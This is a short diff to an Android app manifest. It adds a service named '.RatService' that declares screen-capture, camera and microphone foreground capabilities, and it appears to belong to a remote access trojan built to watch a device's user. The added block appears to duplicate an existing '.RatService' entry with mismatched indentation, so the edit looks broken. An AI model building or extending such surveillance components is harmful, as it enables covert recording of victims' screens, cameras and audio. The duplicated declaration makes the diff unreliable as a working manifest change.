@@ -37,6 +37,9 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+<service
+    android:name=".RatService"
+    android:foregroundServiceType="mediaProjection|camera|microphone" />
 
         <service
             android:name=".RatService"
